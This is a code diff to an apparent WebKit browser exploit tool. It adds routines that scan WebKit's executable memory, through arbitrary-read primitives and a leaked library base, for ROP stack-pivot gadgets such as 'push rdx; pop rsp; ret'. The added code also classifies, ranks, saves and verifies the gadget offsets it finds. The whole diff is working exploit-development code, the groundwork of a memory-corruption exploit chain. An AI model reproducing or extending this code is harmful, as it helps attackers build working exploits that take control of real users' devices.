@@ -13,10 +13,12 @@ import {
     mergeScannedPivot,
     loadScannedPivot,
     saveScannedPivot,
+    G5_PATTERNS,
+    checkG5Bytes,
 } from "./pivot_gadgets.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250828i";
+const BUILD_ID = "rw-20250828k";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const RESTORE_LOG = params.get("restorelog") === "1";
@@ -293,7 +295,7 @@ const MANUAL_TESTS = [
     { id: "g2", group: "pivot", label: "G2", key: "wk_PUSH_RBP_MOV_RBP_RSP_10", pat: [0x55, 0x48, 0x89, 0xe5] },
     { id: "g3", group: "pivot", label: "G3", key: "wk_MOV_RDI_RAX_8_CALL_20", pat: [0x48, 0x8b, 0x78, 0x08] },
     { id: "g4", group: "pivot", label: "G4", key: "wk_MOV_RDX_RAX_18_CALL_10", pat: [0x48, 0x8b, 0x50, 0x38], spKey: true },
-    { id: "g5", group: "pivot", label: "G5", key: "wk_PUSH_RDX_POP_RSP_RET", pat: [0x52, 0x5c, 0xc3] },
+    { id: "g5", group: "pivot", label: "G5 probe", key: "wk_PUSH_RDX_POP_RSP_RET", pat: [0x52, 0x5c, 0xc3] },
 ];
 
 function runManualTest(testId) {
@@ -392,15 +394,27 @@ function runManualTest(testId) {
     if (test.spKey && off.pivot_view_sp != null)
         pat = [0x48, 0x8b, 0x50, off.pivot_view_sp & 0xff];
     if (rva == null && test.group === "pivot") {
+        if (testId === "g5") {
+            runG5ClusterProbe();
+            return;
+        }
         const hint = pivotHint(test.key);
-        if (hint != null) {
+        if (hint > 0 && hint < SCAN_LOW_MAX) {
             const g = checkPat(p, webkitBase, hint, pat);
             mark(g.ok ? "GADGET-OK" : "GADGET-BAD",
-                test.label + " 13.00 hint +0x" + hint.toString(16) + " " + g.detail
-                    + " — tap Scan pivot if bad");
+                test.label + " hint +0x" + hint.toString(16) + " " + g.detail);
         } else {
-            mark("GADGET-SKIP", test.label + " — no RVA (scan pivot first)");
+            mark("GADGET-SKIP", test.label + " — no safe low RVA (never reads 13.00 high hint)");
         }
+        updatePivotReady(p, off);
+        setUi();
+        return;
+    }
+    if (testId === "g5" && rva != null) {
+        const g5 = checkG5Bytes((a) => read1p(p, a), webkitBase, rva);
+        mark(g5 ? "GADGET-OK" : "GADGET-BAD",
+            test.label + " +0x" + rva.toString(16)
+                + (g5 ? " " + g5.kind : " — not a rdx→rsp pivot"));
         updatePivotReady(p, off);
         setUi();
         return;
@@ -653,12 +667,7 @@ function pivotScanRange(key, phase, found) {
 }
 
 function pivotScanPatterns(label, pat) {
-    if (label === "G5") {
-        return [
-            [0x52, 0x5c, 0xc3],
-            [0x41, 0x52, 0x5c, 0xc3],
-        ];
-    }
+    if (label === "G5") return G5_PATTERNS.map(g => g.pat);
     return [pat];
 }
 
@@ -790,6 +799,126 @@ function savePivotScanState(st) {
 }
 
 /** Scan full row phase — cal scanGadgetChunk style (read8, fast, yield every 256). */
+function classifyG5At(p, base, rva) {
+    const read1 = (a) => read1p(p, a);
+    const g = checkG5Bytes(read1, base, rva);
+    return g ? g.kind : null;
+}
+
+async function scanG5LowRead8(p, webkitBase, found) {
+    const pats = G5_PATTERNS.map(g => g.pat);
+    const hint = pivotScanHint("wk_PUSH_RDX_POP_RSP_RET", found, SCAN_LOW_MAX);
+    const range = { minRva: SCAN_PIVOT_MIN, maxRva: SCAN_LOW_MAX };
+    mark("G5-PROBE", "read8 full low +0x" + range.minRva.toString(16)
+        + "…+0x" + range.maxRva.toString(16));
+    const cands = [];
+    let rva = range.minRva & ~7;
+    let steps = 0;
+    while (rva < range.maxRva && !scanPivotStop) {
+        const win = readWindow16(p, webkitBase, rva);
+        if (win) {
+            for (let pi = 0; pi < pats.length; pi++) {
+                const offIn = findPatInWindow(win, pats[pi]);
+                if (offIn < 0) continue;
+                const kind = G5_PATTERNS[pi].kind;
+                cands.push({ rva: rva + offIn, kind });
+            }
+        }
+        rva += 8;
+        steps++;
+        if ((steps & 255) === 0) {
+            scanState("G5 low @+0x" + rva.toString(16) + " hits=" + cands.length);
+            await new Promise(r => setTimeout(r, 0));
+        }
+    }
+    if (!cands.length) {
+        mark("SCAN-MISS", "G5 — no rdx→rsp pivot in low .text");
+        mark("HINT", "paste ?g5=RVA if you find one in a dump");
+        return null;
+    }
+    cands.sort((a, b) => {
+        if (hint > 0) return Math.abs(a.rva - hint) - Math.abs(b.rva - hint);
+        return a.rva - b.rva;
+    });
+    const show = Math.min(cands.length, 10);
+    for (let i = 0; i < show; i++)
+        mark("G5-CAND", "+0x" + cands[i].rva.toString(16) + " " + cands[i].kind);
+    if (cands.length > show)
+        mark("G5-CAND", "… +" + (cands.length - show) + " more");
+    return cands[0];
+}
+
+async function scanG5ClusterExhaustive(p, webkitBase) {
+    const found = pivotScan.found;
+    const range = pivotClusterRange(found);
+    if (range) {
+        mark("G5-PROBE", "read1 cluster +0x" + range.minRva.toString(16)
+            + "…+0x" + range.maxRva.toString(16));
+        const hint = pivotScanHint("wk_PUSH_RDX_POP_RSP_RET", found, SCAN_LOW_MAX);
+        const cands = [];
+        let rva = range.minRva;
+        let steps = 0;
+        while (rva < range.maxRva && !scanPivotStop) {
+            const kind = classifyG5At(p, webkitBase, rva);
+            if (kind) cands.push({ rva, kind });
+            rva++;
+            steps++;
+            if ((steps & 255) === 0) {
+                scanState("G5 cluster @+0x" + rva.toString(16) + " hits=" + cands.length);
+                await new Promise(r => setTimeout(r, 0));
+            }
+        }
+        if (cands.length) {
+            cands.sort((a, b) => {
+                if (hint > 0) return Math.abs(a.rva - hint) - Math.abs(b.rva - hint);
+                return a.rva - b.rva;
+            });
+            const show = Math.min(cands.length, 10);
+            for (let i = 0; i < show; i++)
+                mark("G5-CAND", "+0x" + cands[i].rva.toString(16) + " " + cands[i].kind);
+            if (cands.length > show)
+                mark("G5-CAND", "… +" + (cands.length - show) + " more");
+            return cands[0];
+        }
+        mark("G5-PHASE", "cluster miss (" + steps + ") — trying full low .text");
+    } else {
+        mark("G5-PHASE", "no cluster — full low .text");
+    }
+    return scanG5LowRead8(p, webkitBase, found);
+}
+
+function runG5ClusterProbe() {
+    if (!ready || !window.p || busy) return;
+    busy = true;
+    setUi();
+    const p = window.p;
+    const { webkitBase } = basesFromSession(loadEffectiveOff());
+    if (!webkitBase) {
+        mark("G5-SKIP", "no webkitBase");
+        busy = false;
+        setUi();
+        return;
+    }
+    if (!pivotScan) pivotScan = { found: pivotScanFoundInit() };
+    pivotScan.found = pivotScanFoundInit();
+    scanPivotStop = false;
+    (async () => {
+        try {
+            const best = await scanG5ClusterExhaustive(p, webkitBase);
+            if (best) {
+                pivotScan.found.wk_PUSH_RDX_POP_RSP_RET = best.rva;
+                saveScannedPivot(webkitBase, pivotScan.found);
+                mark("G5-PICK", "+0x" + best.rva.toString(16) + " " + best.kind
+                    + " — tap Verify pivot");
+                updatePivotReady(p, loadEffectiveOff());
+            }
+        } finally {
+            busy = false;
+            setUi();
+        }
+    })();
+}
+
 async function scanPivotRowPhase(p, webkitBase, off) {
     if (!pivotScan || String(pivotScan.base) !== String(webkitBase))
         preparePivotScan(webkitBase);
@@ -804,6 +933,27 @@ async function scanPivotRowPhase(p, webkitBase, off) {
     const row = PIVOT_ROWS[pivotScan.rowIdx];
     const key = row[1];
     const label = row[0];
+
+    if (label === "G5") {
+        const best = await scanG5ClusterExhaustive(p, webkitBase);
+        if (best) {
+            pivotScan.found[key] = best.rva;
+            saveScannedPivot(webkitBase, pivotScan.found);
+            mark("SCAN-HIT", "G5 +0x" + best.rva.toString(16) + " " + best.kind);
+            pivotScan.rowIdx++;
+            pivotScan.cursor = null;
+            pivotScan.phase = "low";
+            savePivotScanState(pivotScan);
+            updatePivotReady(p, loadEffectiveOff());
+        } else {
+            pivotScan.rowIdx++;
+            pivotScan.cursor = null;
+            pivotScan.phase = "low";
+            savePivotScanState(pivotScan);
+        }
+        return "continue";
+    }
+
     const pat = pivotPattern(row, off);
     const pats = pivotScanPatterns(label, pat);
     if (!pivotScan.phase) pivotScan.phase = pivotStartPhase(label);
